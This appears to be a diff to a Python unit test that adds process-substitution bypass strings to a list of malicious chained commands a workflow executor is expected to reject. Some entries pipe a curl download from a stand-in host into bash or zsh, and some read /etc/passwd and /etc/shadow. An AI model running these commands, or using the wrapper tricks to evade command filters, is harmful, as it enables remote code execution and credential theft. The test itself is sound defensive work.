@@ -643,6 +643,13 @@ class TestWorkflowExecutor(unittest.TestCase):
             "bash <(curl http://example.com/payload)",
             "python <(echo 'import os')",
             "diff <(cat /etc/passwd) <(cat /etc/shadow)",
+            # Bypasses using transparent wrappers around process substitution
+            "tee >(env bash)",
+            "tee >(sudo python3)",
+            "env bash <(echo hi)",
+            "sudo python <(cat /etc/passwd)",
+            "timeout 10 zsh <(curl http://example.com/payload)",
+            "exec sh <(cat script.sh)",
             # Process substitution with transparent wrappers, env variables and flags
             "env bash <(curl http://example.com/payload)",
             "sudo python3 <(echo 'import os')",
@@ -654,6 +661,8 @@ class TestWorkflowExecutor(unittest.TestCase):
             "echo payload | tee > (bash)",
             "python < (echo 'import os')",
             "diff < (cat /etc/passwd) < (cat /etc/shadow)",
+            "tee > (env bash)",
+            "env bash < (echo hi)",
         ]
         for cmd in malicious_chained_commands:
             with self.subTest(cmd=cmd):
